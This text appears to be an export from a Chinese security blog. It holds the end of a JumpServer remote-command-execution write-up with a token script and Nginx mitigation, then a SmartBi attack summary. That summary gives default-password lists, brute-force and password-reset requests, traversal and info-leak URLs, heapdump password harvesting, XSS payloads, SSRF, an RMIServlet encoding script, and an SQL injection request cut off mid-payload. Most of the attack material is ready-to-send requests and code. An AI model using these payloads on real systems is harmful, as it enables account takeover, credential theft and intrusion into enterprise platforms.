&quot;61ec790f-b47b-4cb5-b598-548a559ba44e&quot;, &quot;asset&quot;: &quot;90e76a94-e014-495a-80e4-81c2e01de480&quot; 获取token12345678910POST /api/v1/users/connection-token/?user-only=1 HTTP/1.1Host: 192.168.132.130:8080Connection: closeAccept-Encoding: gzip, deflateAccept: */*User-Agent: python-requests/2.25.1Content-Length: 152Content-Type: application/json{&quot;system_user&quot;: &quot;8bdae30c-dada-4676-90fe-797941d569cd&quot;, &quot;user&quot;: &quot;61ec790f-b47b-4cb5-b598-548a559ba44e&quot;, &quot;asset&quot;: &quot;90e76a94-e014-495a-80e4-81c2e01de480&quot;} 获取到token： 1{&quot;token&quot;:&quot;f1126d5d-6437-4aeb-a7f0-da5c9e76c5b7&quot;} 有效期只有20s Py-Demo 123456789101112131415import requestsimport jsondata={&quot;user&quot;: &quot;61ec790f-b47b-4cb5-b598-548a559ba44e&quot;, &quot;asset&quot;: &quot;90e76a94-e014-495a-80e4-81c2e01de480&quot;, &quot;system_user&quot;: &quot;8bdae30c-dada-4676-90fe-797941d569cd&quot;}url_host='http://192.168.132.130:8080'proxies={'http':'http://127.0.0.1:8080'}def get_token(): url = url_host+'/api/v1/users/connection-token/?user-only=1' response = requests.post(url, json=data,proxies=proxies).json() print(response) return response['token']get_token() 获取响应的通讯IDws://192.168.132.130:8080/koko/ws/token/?target_id=f1126d5d-6437-4aeb-a7f0-da5c9e76c5b7 之后通过临时token 进行ws的访问，进而命令执行。 三个值在日志中体现如下： 1、在docker中的core中gunicorn.log文件中 123456789101112131415161718192021222324252627282930[root@www jumpserver]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESd622578bafab jumpserver/nginx:alpine2 &quot;sh -c 'crond -b -d …&quot; About an hour ago Up About an hour (healthy) 0.0.0.0:8080-&gt;80/tcp, 0.0.0.0:8443-&gt;443/tcp jms_nginx1027e9f8f2ec jumpserver/guacamole:v2.6.1 &quot;/init&quot; About an hour ago Up About an hour (healthy) 8080/tcp jms_guacamole23f1a02bfd9d jumpserver/core:v2.6.1 &quot;./entrypoint.sh sta…&quot; About an hour ago Up About an hour (healthy) 8070/tcp, 8080/tcp jms_celeryfceeb00ef925 jumpserver/luna:v2.6.1 &quot;/docker-entrypoint.…&quot; About an hour ago Up About an hour (healthy) 80/tcp jms_lunaf9dbd7a214a1 jumpserver/koko:v2.6.1 &quot;./entrypoint.sh&quot; About an hour ago Up About an hour (healthy) 0.0.0.0:2222-&gt;2222/tcp, 5000/tcp jms_kokode0493c1c684 jumpserver/lina:v2.6.1 &quot;/docker-entrypoint.…&quot; About an hour ago Up About an hour (healthy) 80/tcp jms_linab58ecd6cd3d8 jumpserver/core:v2.6.1 &quot;./entrypoint.sh sta…&quot; About an hour ago Up About an hour (healthy) 8070/tcp, 8080/tcp jms_core72599fc5b96e jumpserver/redis:6-alpine &quot;docker-entrypoint.s…&quot; 3 days ago Up 3 hours (healthy) 6379/tcp jms_redisc2cecdd822bc jumpserver/mysql:5 &quot;docker-entrypoint.s…&quot; 3 days ago Up 3 hours (healthy) 3306/tcp, 33060/tcp jms_mysql[root@www jumpserver]# docker exec -it b58ecd6cd3d8 bashroot@b58ecd6cd3d8:/opt/jumpserver# lsapps data entrypoint.sh logs release tmpconfig_example.yml Dockerfile jms README_EN.md requirements utilsconfig.yml docs LICENSE README.md run_server.py Vagrantfileroot@b58ecd6cd3d8:/opt/jumpserver# cd logsroot@b58ecd6cd3d8:/opt/jumpserver/logs# lsansible.log celery_heavy_tasks.log gunicorn.logbeat.log celery_node_tree.log jumpserver.logcelery_ansible.log daphne.log unexpected_exception.logcelery_check_asset_perm_expired.log drf_exception.logcelery_default.log flower.logroot@b58ecd6cd3d8:/opt/jumpserver/logs# cat gunicorn.log | grep api/v1/perms/asset-permissions/user/validate192.168.250.6 [25/Jan/2021:17:03:58 +0800] &quot;GET /api/v1/perms/asset-permissions/user/validate/?action_name=connect&amp;asset_id=90e76a94-e014-495a-80e4-81c2e01de480&amp;cache_policy=1&amp;system_user_id=8bdae30c-dada-4676-90fe-797941d569cd&amp;user_id=61ec790f-b47b-4cb5-b598-548a559ba44e HTTP/1.1&quot; 200 12192.168.250.6 [25/Jan/2021:17:03:58 +0800] &quot;GET /api/v1/perms/asset-permissions/user/validate/?action_name=connect&amp;asset_id=90e76a94-e014-495a-80e4-81c2e01de480&amp;cache_policy=1&amp;system_user_id=8bdae30c-dada-4676-90fe-797941d569cd&amp;user_id=61ec790f-b47b-4cb5-b598-548a559ba44e HTTP/1.1&quot; 200 12192.168.250.6 [25/Jan/2021:17:04:22 +0800] &quot;GET /api/v1/perms/asset-permissions/user/validate/?action_name=connect&amp;asset_id=90e76a94-e014-495a-80e4-81c2e01de480&amp;cache_policy=1&amp;system_user_id=8bdae30c-dada-4676-90fe-797941d569cd&amp;user_id=61ec790f-b47b-4cb5-b598-548a559ba44e HTTP/1.1&quot; 200 12192.168.250.6 [25/Jan/2021:17:44:13 +0800] &quot;GET /api/v1/perms/asset-permissions/user/validate/?action_name=connect&amp;asset_id=90e76a94-e014-495a-80e4-81c2e01de480&amp;cache_policy=1&amp;system_user_id=8bdae30c-dada-4676-90fe-797941d569cd&amp;user_id=61ec790f-b47b-4cb5-b598-548a559ba44e HTTP/1.1&quot; 200 12192.168.250.6 [25/Jan/2021:18:02:16 +0800] &quot;GET /api/v1/perms/asset-permissions/user/validate/?action_name=connect&amp;asset_id=90e76a94-e014-495a-80e4-81c2e01de480&amp;cache_policy=1&amp;system_user_id=8bdae30c-dada-4676-90fe-797941d569cd&amp;user_id=61ec790f-b47b-4cb5-b598-548a559ba44e HTTP/1.1&quot; 200 12root@b58ecd6cd3d8:/opt/jumpserver/logs# 2、 代码分析查看代码修改记录1、查看单个文件 https://github.com/jumpserver/jumpserver/blob/master/apps/authentication/api/auth.py 2、查看历史记录 将github.com替换为github.githistory.xyz 3、查看修改日期2021-01-14 https://githistory.xyz/jumpserver/jumpserver/blob/db6f7f66b2e5e557081cb561029f64af0a1f80c4/apps/ops/ws.py https://github.com/jumpserver/jumpserver/commit/db6f7f66b2e5e557081cb561029f64af0a1f80c4 代码调用逻辑 web终端地方存在相关token操作的js 123456789let wsURL = baseWsUrl + '/koko/ws/terminal/?' + urlParams.toString();switch (urlParams.get(&quot;type&quot;)) { case 'token': wsURL = baseWsUrl + &quot;/koko/ws/token/?&quot; + urlParams.toString(); break default:}ws = new WebSocket(wsURL, [&quot;JMS-KOKO&quot;]);term = createTerminalById(elementId) 12345678910111213141516171819202122232425262728293031func (s *server) websocketHandlers(router *gin.RouterGroup) { #web终端地方存在相关token操作的js的对应服务端/ws/token 路由 wsGroup := router.Group(&quot;/ws/&quot;) wsGroup.Group(&quot;/terminal&quot;).Use( s.middleSessionAuth()).GET(&quot;/&quot;, s.processTerminalWebsocket) wsGroup.Group(&quot;/elfinder&quot;).Use( s.middleSessionAuth()).GET(&quot;/&quot;, s.processElfinderWebsocket) wsGroup.Group(&quot;/token&quot;).GET(&quot;/&quot;, s.processTokenWebsocket)}func (s *server) processTokenWebsocket(ctx *gin.Context) { #判断是否有token,并查询相应的token对应的参数并运行虚拟终端 tokenId, _ := ctx.GetQuery(&quot;target_id&quot;) tokenUser := service.GetTokenAsset(tokenId) if tokenUser.UserID == &quot;&quot; { logger.Errorf(&quot;Token is invalid: %s&quot;, tokenId) ctx.AbortWithStatus(http.StatusBadRequest) return } currentUser := service.GetUserDetail(tokenUser.UserID) if currentUser == nil { logger.Errorf(&quot;Token userID is invalid: %s&quot;, tokenUser.UserID) ctx.AbortWithStatus(http.StatusBadRequest) return } targetType := TargetTypeAsset targetId := strings.ToLower(tokenUser.AssetID) systemUserId := tokenUser.SystemUserID s.runTTY(ctx, currentUser, targetType, targetId, systemUserId)} 浏览器体现方式 修复方式官方修复方式： https://blog.fit2cloud.com/?p=1761 将JumpServer升级至安全版本； 临时修复方案: 修改 Nginx 配置文件屏蔽漏洞接口 12345/api/v1/authentication/connection-token//api/v1/users/connection-token/ Nginx 配置文件位置 12345678# 社区老版本/etc/nginx/conf.d/jumpserver.conf# 企业老版本jumpserver-release/nginx/http_server.conf# 新版本在 jumpserver-release/compose/config_static/http_server.conf 修改 Nginx 配置文件实例 12345678910111213141516171819# 保证在 /api 之前 和 / 之前location /api/v1/authentication/connection-token/ { return 403;}location /api/v1/users/connection-token/ { return 403;}# 新增以上这些location /api/ { proxy_set_header X-Real-IP $remote_addr; proxy_set_header Host $host; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_pass http://core:8080; }... 修改完成后重启 nginx 12345docker方式: docker restart jms_nginxnginx方式:systemctl restart nginx 修复验证 12345$ wget https://github.com/jumpserver/jumpserver/releases/download/v2.6.2/jms_bug_check.sh # 使用方法 bash jms_bug_check.sh HOST $ bash jms_bug_check.sh demo.jumpserver.org漏洞已修复","link":"/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/"},{"title":"smartBi总结","text":"SmartBi简介Smartbi是企业级商业智能和大数据分析平台，满足用户在企业级报表、数据可视化分析、自助分析平台、数据挖掘建模、AI智能分析等大数据分析需求。该软件应用范围较广，据官网介绍，在全球财富500强的10家国内银行，有8家选用了Smartbi。 登录入口https://127.0.0.1/vision/mobileportal.jsp https://127.0.0.1/vision/mobileX/login https://127.0.0.1/vision/index.jsp 密码正确的情况下，部分平台无法登陆，此时设置user-agent为手机端就可以。 SmartBi的两种传参方式RMIServlet加密123456789101112131415POST /vision/RMIServlet HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: https://127.0.0.1/vision/index.jspIf-Modified-Since: 0Content-Type: application/x-www-form-urlencoded;charset=UTF-8Content-Length: 148Authorization: Basic YWRtaW46YWRtaW4=Connection: closeCookie: JSESSIONID=848B4743452D02C5A53FECCA58C47299encode=zDp4Wp4gRip+Q5h(kpzDp4xw4tI(6-p+/JV/uuc'(mKi(Kp719J(~K((~K(((pm719JhNp'uKiMM('9/uu/ut/uuXIw6--Qw1/uu/ut/uu6QSS/uu/ut/uuY!a0bp1uN/uu/utk4Qp/JT 直接传输1encode=zDp4Wp4gRip+Q5h(kpzDp4xw4tI(6-p+/JV/uuc'(mKi(Kp719J(~K((~K(((pm719JhNp'uKiMM('9/uu/ut/uuXIw6--Qw1/uu/ut/uu6QSS/uu/ut/uuY!a0bp1uN/uu/utk4Qp/JT ecode加密字段解密后为： 1UserService+updateUserForChange+[&quot;I8a94ca4e0175ab4aab4aaae90175d3e824c66a87&quot;,&quot;zhongguo1&quot;,&quot;null&quot;,&quot;QWEqwe123&quot;,true] 等同于 1className=UserService&amp;methodName=updateUserForChange&amp;params=[&quot;I8a94ca4e0175ab4aab4aaae90175d3e824c66a87&quot;,&quot;zhongguo1&quot;,&quot;null&quot;,&quot;QWEqwe123&quot;,true] 构造数据包： 123456789101112131415POST /vision/RMIServlet HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: https://127.0.0.1/vision/index.jspIf-Modified-Since: 0Content-Type: application/x-www-form-urlencoded;charset=UTF-8Content-Length: 148Authorization: Basic YWRtaW46YWRtaW4=Connection: closeCookie: JSESSIONID=848B4743452D02C5A53FECCA58C47299className=UserService&amp;methodName=updateUserForChange&amp;params=[&quot;I8a94ca4e0175ab4aab4aaae90175d3e824c66a87&quot;,&quot;zhongguo1&quot;,&quot;null&quot;,&quot;QWEqwe123&quot;,true] 登录暴破1234567891011121314POST /vision/RMIServlet HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Linux; Android 8.0.0; PRA-LX3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: https://127.0.0.1/vision/mobileX/logincontent-type: application/x-www-form-urlencodedContent-Length: 70Authorization: Basic YWRtaW46YWRtaW4=Connection: closeCookie: JSESSIONID=1DA1DAA51469E646F97AD829F29A2B15className=UserService&amp;methodName=login&amp;params=[&quot;admin&quot;,&quot;admin&quot;] 抓取true/false字段 401认证弱口令及敏感目录401弱口令/vision目录下的文件都需要401认证 12345678910admin/adminadmin/manageradmin/2managermining/admindemo/demomanager/demomanager/adminuser/admintest/adminhuanan/admin 实测发现不论用户名输什么，只要密码正确即可 查看版本https://127.0.0.1/vision/version.txt 12021-01-11 15:11:24 https://127.0.0.1/vision/packageinfo.txt 123456Build Time:20200918153547 War Type:dist TAG:Branch_SmartbiV85_6_20190221 Version:8.5.658863.20385 VersionType:Smartbi Insight Edition c0d53d51438945fa5b9839b3e0111e660792d2e1 Spreadsheet fake 目录遍历https://127.0.0.1/vision/chooser.jsp?key=CONFIG_FILE_DIR&amp;root=%2F 信息泄露 https://127.0.0.1/vision/monitor/sysprops.jsp https://127.0.0.1/vision/monitor/getclassurl.jsp?classname=smartbi.freequery.expression.ast.TextNode https://127.0.0.1/vision/monitor/hardwareinfo.jsp 接口泄露（直接访问wsdl无需401）https://127.0.0.1/vision/listwsdl.jsp 提供资源目录树的访问功能https://127.0.0.1/vision/services/CatalogService?wsdlSimpleReportService 提供灵活报表相关操作功能 https://127.0.0.1/vision/services/SimpleReportService?wsdlBusinessViewService 提供数据集定义相关操作功能 https://127.0.0.1/vision/services/BusinessViewService?wsdlDataSourceService 提供数据源相关操作功能 https://127.0.0.1/vision/services/DataSourceService?wsdlAnalysisReportService 提供多维分析相关操作功能 https://127.0.0.1/vision/services/AnalysisReportService?wsdlUserManagerService 提供用户相关操作，包括：读取/维护用户信息、读取/维护组信息、读取/维护角色信息、为用户和组分配角色等 https://127.0.0.1/vision/services/UserManagerService?wsdl session劫持+重置用户密码（无需原密码）https://127.0.0.1/vision/monitor/listsessions.jsp 理论上重置成功，返回为true，但是实际测试过程中修改后的密码既不是改之前的密码，也不是修改后的密码，过一段时间自动重置为原来的密码。 数据包: 123456789101112131415POST /vision/RMIServlet HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: https://127.0.0.1/vision/index.jspIf-Modified-Since: 0Content-Type: application/x-www-form-urlencoded;charset=UTF-8Content-Length: 148Authorization: Basic YWRtaW46YWRtaW4=Connection: closeCookie: JSESSIONID=848B4743452D02C5A53FECCA58C47299className=UserService&amp;methodName=updateUserForChange&amp;params=[&quot;I8a94ca4e0175ab4aab4aaae90175d3e824c66a87&quot;,&quot;zhongguo1&quot;,&quot;null&quot;,&quot;QWEqwe123&quot;,true] 123456789101112131415POST /vision/RMIServlet HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: https://127.0.0.1/vision/index.jspIf-Modified-Since: 0Content-Type: application/x-www-form-urlencoded;charset=UTF-8Content-Length: 133Authorization: Basic YWRtaW46YWRtaW4=Connection: closeCookie: JSESSIONID=848B4743452D02C5A53FECCA58C47299className=UserService&amp;methodName=addUserAttribute&amp;params=[&quot;I8a94ca4e0175ab4aab4aaae90175d3e824c66a87&quot;,&quot;SYSTEM_user_isEdit&quot;,&quot;0&quot;,null] 其中I8a94ca4e0175ab4aab4aaae90175d3e824c66a87为用户的id字段，唯一身份标识 heapdump缓存抓取密码https://127.0.0.1/vision/monitor/heapdump.jsp https://127.0.0.1/vision/monitor/heapdump.jsp?dumpbin=true 使用Eclipse Memory Analyzer解析内存文件 1select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;password&quot;)) 反射型/存储型XSShttps://127.0.0.1/vision/chooser.jsp?key=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E&amp;root=/u01/data/domains/app_domain https://127.0.0.1/vision/monitor/testmailserver.jsp?host=mail.longtop.com&amp;user=111%22%3E%3Cimg%20src=x%20onerror=prompt(0)%3E&amp;pass=123456 登录后个人参数位置，加密后传参可导致存储型xss SSRF探测出口ip： https://127.0.0.1/vision/monitor/testmailserver.jsp RMIServet加解密1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950from urllib.parse import unquotefrom urllib.parse import quoteENCODING_SCHEDULE = { &quot;0&quot;: &quot;7&quot;, &quot;1&quot;: &quot;1&quot;, &quot;2&quot;: &quot;u&quot;, &quot;3&quot;: &quot;N&quot;, &quot;4&quot;: &quot;K&quot;, &quot;5&quot;: &quot;J&quot;, &quot;6&quot;: &quot;M&quot;, &quot;7&quot;: &quot;9&quot;, &quot;8&quot;: &quot;'&quot;, &quot;9&quot;: &quot;m&quot;, &quot;!&quot;: &quot;P&quot;, &quot;%&quot;: &quot;/&quot;, &quot;'&quot;: &quot;n&quot;, &quot;(&quot;: &quot;A&quot;, &quot;)&quot;: &quot;E&quot;, &quot;*&quot;: &quot;s&quot;, &quot;+&quot;: &quot;+&quot;, &quot;-&quot;: &quot;f&quot;, &quot;.&quot;: &quot;q&quot;, &quot;A&quot;: &quot;O&quot;, &quot;B&quot;: &quot;V&quot;, &quot;C&quot;: &quot;t&quot;, &quot;D&quot;: &quot;T&quot;, &quot;E&quot;: &quot;a&quot;, &quot;F&quot;: &quot;x&quot;, &quot;G&quot;: &quot;H&quot;, &quot;H&quot;: &quot;r&quot;, &quot;I&quot;: &quot;c&quot;, &quot;J&quot;: &quot;v&quot;, &quot;K&quot;: &quot;l&quot;, &quot;L&quot;: &quot;8&quot;, &quot;M&quot;: &quot;F&quot;, &quot;N&quot;: &quot;3&quot;, &quot;O&quot;: &quot;o&quot;, &quot;P&quot;: &quot;L&quot;, &quot;Q&quot;: &quot;Y&quot;, &quot;R&quot;: &quot;j&quot;, &quot;S&quot;: &quot;W&quot;, &quot;T&quot;: &quot;*&quot;, &quot;U&quot;: &quot;z&quot;, &quot;V&quot;: &quot;Z&quot;, &quot;W&quot;: &quot;!&quot;, &quot;X&quot;: &quot;B&quot;, &quot;Y&quot;: &quot;)&quot;, &quot;Z&quot;: &quot;U&quot;, &quot;a&quot;: &quot;(&quot;, &quot;b&quot;: &quot;~&quot;, &quot;c&quot;: &quot;i&quot;, &quot;d&quot;: &quot;h&quot;, &quot;e&quot;: &quot;p&quot;, &quot;f&quot;: &quot;_&quot;, &quot;g&quot;: &quot;-&quot;, &quot;h&quot;: &quot;I&quot;, &quot;i&quot;: &quot;R&quot;, &quot;j&quot;: &quot;.&quot;, &quot;k&quot;: &quot;G&quot;, &quot;l&quot;: &quot;S&quot;, &quot;m&quot;: &quot;d&quot;, &quot;n&quot;: &quot;6&quot;, &quot;o&quot;: &quot;w&quot;, &quot;p&quot;: &quot;5&quot;, &quot;q&quot;: &quot;0&quot;, &quot;r&quot;: &quot;4&quot;, &quot;s&quot;: &quot;D&quot;, &quot;t&quot;: &quot;k&quot;, &quot;u&quot;: &quot;Q&quot;, &quot;v&quot;: &quot;g&quot;, &quot;w&quot;: &quot;b&quot;, &quot;x&quot;: &quot;C&quot;, &quot;y&quot;: &quot;2&quot;, &quot;z&quot;: &quot;X&quot;, &quot;~&quot;: &quot;e&quot;, &quot;_&quot;: &quot;y&quot;, }DECODING_SCHEDULE = { &quot;7&quot;: &quot;0&quot;, &quot;1&quot;: &quot;1&quot;, &quot;u&quot;: &quot;2&quot;, &quot;N&quot;: &quot;3&quot;, &quot;K&quot;: &quot;4&quot;, &quot;J&quot;: &quot;5&quot;, &quot;M&quot;: &quot;6&quot;, &quot;9&quot;: &quot;7&quot;, &quot;'&quot;: &quot;8&quot;, &quot;m&quot;: &quot;9&quot;, &quot;P&quot;: &quot;!&quot;, &quot;/&quot;: &quot;%&quot;, &quot;n&quot;: &quot;'&quot;, &quot;A&quot;: &quot;(&quot;, &quot;E&quot;: &quot;)&quot;, &quot;s&quot;: &quot;*&quot;, &quot;+&quot;: &quot;+&quot;, &quot;f&quot;: &quot;-&quot;, &quot;q&quot;: &quot;.&quot;, &quot;O&quot;: &quot;A&quot;, &quot;V&quot;: &quot;B&quot;, &quot;t&quot;: &quot;C&quot;, &quot;T&quot;: &quot;D&quot;, &quot;a&quot;: &quot;E&quot;, &quot;x&quot;: &quot;F&quot;, &quot;H&quot;: &quot;G&quot;, &quot;r&quot;: &quot;H&quot;, &quot;c&quot;: &quot;I&quot;, &quot;v&quot;: &quot;J&quot;, &quot;l&quot;: &quot;K&quot;, &quot;8&quot;: &quot;L&quot;, &quot;F&quot;: &quot;M&quot;, &quot;3&quot;: &quot;N&quot;, &quot;o&quot;: &quot;O&quot;, &quot;L&quot;: &quot;P&quot;, &quot;Y&quot;: &quot;Q&quot;, &quot;j&quot;: &quot;R&quot;, &quot;W&quot;: &quot;S&quot;, &quot;*&quot;: &quot;T&quot;, &quot;z&quot;: &quot;U&quot;, &quot;Z&quot;: &quot;V&quot;, &quot;!&quot;: &quot;W&quot;, &quot;B&quot;: &quot;X&quot;, &quot;)&quot;: &quot;Y&quot;, &quot;U&quot;: &quot;Z&quot;, &quot;(&quot;: &quot;a&quot;, &quot;~&quot;: &quot;b&quot;, &quot;i&quot;: &quot;c&quot;, &quot;h&quot;: &quot;d&quot;, &quot;p&quot;: &quot;e&quot;, &quot;_&quot;: &quot;f&quot;, &quot;-&quot;: &quot;g&quot;, &quot;I&quot;: &quot;h&quot;, &quot;R&quot;: &quot;i&quot;, &quot;.&quot;: &quot;j&quot;, &quot;G&quot;: &quot;k&quot;, &quot;S&quot;: &quot;l&quot;, &quot;d&quot;: &quot;m&quot;, &quot;6&quot;: &quot;n&quot;, &quot;w&quot;: &quot;o&quot;, &quot;5&quot;: &quot;p&quot;, &quot;0&quot;: &quot;q&quot;, &quot;4&quot;: &quot;r&quot;, &quot;D&quot;: &quot;s&quot;, &quot;k&quot;: &quot;t&quot;, &quot;Q&quot;: &quot;u&quot;, &quot;g&quot;: &quot;v&quot;, &quot;b&quot;: &quot;w&quot;, &quot;C&quot;: &quot;x&quot;, &quot;2&quot;: &quot;y&quot;, &quot;X&quot;: &quot;z&quot;, &quot;e&quot;: &quot;~&quot;, &quot;y&quot;: &quot;_&quot;, }#此函数可以用来加密明文也可以解密服务器返回的密文def encode(code): out = &quot;&quot; for item in code: out = out + ENCODING_SCHEDULE.get(item, item) return outdef decode(code): out = &quot;&quot; for item in code: out = out + DECODING_SCHEDULE.get(item, item) return outdef read(): with open('read.txt', 'r') as f: return f.read()a=read()b = decode(a)c = encode(a)print('Input: ' + a + '\\n')print('decode: ' + b + '\\n')print('decode-unquote-url: '+unquote(b,'utf-8'))print()print('encode: '+c)print() 注：加密和解密的过程就是替换字符的过程，最终解密得到的是url编码，加密时传入的文本也要是url编码 decode-unquote-url只是为了方便阅读 SQl注入需要登录，任意报表功能 https://127.0.0.1/vision/ssreportServlet 123456789101112131415POST /vision/ssreportServlet HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: https://127.0.0.1/vision/openresource.jsp?iPad=true&amp;refresh=true&amp;showtoolbar=false&amp;showPath=false&amp;resid=I40281d81016a8bc28bc20231016aaee007b230ac&amp;_timestamp=1610433924926Content-Type: application/x-www-form-urlencodedContent-Length: 3293Authorization: Basic YWRtaW46YWRtaW4=Connection: closeCookie: FQPassword=; JSESSIONID=4BB550BF10C606619B753D3CE52CD3ABUpgrade-Insecure-Requests: 1sheetIndex=0&amp;resid=I40281d81016a8bc28bc20231016aaee007b230ac&amp;clientId=Iff8080810176f0c7f0c7544f0176f54eb72c1160&amp;refreshType=refresh&amp;paramsInfoEncode=encode=/JV/9V/uuRh/uu/NO/uuoQk5QkL(4(dpkp4qcK7u'1h'171M('~iu'~iu7uN171M((7~pu1m9u'~Mq/aJ/'T/mJ/aK/VT/'T/aJ/m7/'T/a9/O9/V7/uu/ut/uu6(dp/uu/NO/uu/aJ/'T/mJ/aK/VT/'T/aJ/m7/'T/a9/O9/V7/uu/ut/uu(SR(D/uu/NO/uu/aJ/'T/mJ/aK/VT/'T/aJ/m7/'T/a9/O9/V7/uu/ut/uug(SQp/uu/NO/uun111/uu/ut/uuhRD5S(2Z(SQp/uu/NO/uun111/uu/9T/ut/9V/uuRh/uu/NO/uuoQk5QkL(4(dpkp4qcK7u'1h'171M('~iu'~iu7uN171M((7~pu1m9u'~Mq/aM/'m/'7/aJ/V1/ma/aM/mt/VO/aM/ma/'K/uu/ut/uu6(dp/uu/NO/uu/aM/'m/'7/aJ/V1/ma/aM/mt/VO/aM/ma/'K/uu/ut/uu(SR(D/uu/NO/uu/aM/'m/'7/aJ/V1/ma/aM/mt/VO/aM/ma/'K/uu/ut/uug(SQp/uu/NO/uu/uu/ut/uuhRD5S(2Z(SQp/uu/NO/uu/uu/9T/ut/9V/uuRh/uu/NO/uuoQk5QkL(4(dpkp4qcK7u'1h'171M('~iu'~iu7uN171M((7~pu1m9u'~Mq/aM/'m/'7/aJ/mt/O'/a9/mt/'1/aK/VV/VT/uu/ut/uu6(dp/uu/NO/uu/aM/'m/'7/aJ/mt/O'/a9/mt/'1/aK/VV/VT/uu/ut/uu(SR(D/uu/NO/uu/aM/'m/'7/aJ/mt/O'/a9/mt/'1/aK/VV/VT/uu/ut/uug(SQp/uu/NO/uuKK7777/uu/ut/uuhRD5S(2Z(SQp/uu/NO/uu/aJ/Vm/Vx/aK/V'/mt/uu/9T/ut/9V/uuRh/uu/NO/uuoQk5QkL(4(dpkp4qcK7u'1h'171M('~iu'~iu7uN171M((7~pu1m9u'~Mq/aM/'m/'7/aJ/mt/O'/aJ/mt/V7/aJ/V'/'u/uu/ut/uu6(dp/uu/NO/uu/aM/'m/'7/aJ/mt/O'/aJ/mt/V7/aJ/V'/'u/uu/ut/uu(SR(D/uu/NO/uu/aM/'m/'7/aJ/mt/O'/aJ/mt/V7/aJ/V'/'u/uu/ut/uug(SQp/uu/NO/uu/uu/ut/uuhRD5S(2Z(SQp/uu/NO/uu/aJ/'J/O'/am/'N/O'/uu/9T/ut/9V/uuRh/uu/NO/uuoQk5QkL(4(dpkp4qcK7u'1h'171M('~iu'~iu7uN171M((7~pu1m9u'~Mq/aM/'m/'7/aJ/mt/O'/aJ/'t/VO/aJ/'a/Vx/uu/ut/uu6(dp/uu/NO/uu/aM/'m/'7/aJ/mt/O'/aJ/'t/VO/aJ/'a/Vx/uu/ut/uu(SR(D/uu/NO/uu/aM/'m/'7/aJ/mt/O'/aJ/'t/VO/aJ/'a/Vx/uu/ut/uug(SQp/uu/NO/uu/uu/ut/uuhRD5S(2Z(SQp/uu/NO/uu/aJ/'J/O'/am/'N/O'/uu/9T/ut/9V/uuRh/uu/NO/uuoQk5QkL(4(dpkp4qcK7u'1h'171M('~iu'~iu7uN171M((7~pu1m9u'~MqRh/uu/ut/uu6(dp/uu/NO/uuRh/uu/ut/uu(SR(D/uu/NO/uu/aM/ON/'7/aM/VJ/'V/aM/mt/VO/aM/ma/'KRh/uu/ut/uug(SQp/uu/NO/uu/uu/ut/uuhRD5S(2Z(SQp/uu/NO/uu/uu/9T/ut/9V/uuRh/uu/NO/uuoQk5QkL(4(dpkp4qcK7u'1h'171M('~iu'~iu7uN171M((7~pu1m9u'~Mq/aJ/O1/OV/aM/'O/OJ/aM/m9/VM/am/m9/VK/a'/VJ/V9/uu/ut/uu6(dp/uu/NO/uu/aJ/O1/OV/aM/'O/OJ/aM/m9/VM/am/m9/VK/a'/VJ/V9/uu/ut/uu(SR(D/uu/NO/uu/aJ/O1/OV/aM/'O/OJ/aM/m9/VM/am/m9/VK/a'/VJ/V9/uu/ut/uug(SQp/uu/NO/uu/uu/ut/uuhRD5S(2Z(SQp/uu/NO/uu/uu/9T/ut/9V/uuRh/uu/NO/uuoQk5QkL(4(dpkp4qcK7u'1h'171M('~iu'~iu7uN171M((7~pu1m9u'~Mq/aJ/O1/OV/aM/'O/OJ/aM/m9/VM/am/m9/VK/aM/OT/Ou/uu/ut/uu6(dp/uu/NO/uu/aJ/O1/OV/aM/'O/OJ/aM/m9/VM/am/m9/VK/aM/OT/Ou/uu/ut/uu(SR(D/uu/NO/uu/aJ/O1/OV/aM/'O/OJ/aM/m9/VM/am/m9/VK/aM/OT/Ou/uu/ut/uug(SQp/uu/NO/uu/uu/ut/uuhRD5S(2Z(SQp/uu/NO/uu/uu/9T/ut/9V/uuRh/uu/NO/uuoQk5QkL(4(dpkp4qcK7u'1h'171M('~iu'~iu7uN171M((7~pu1m9u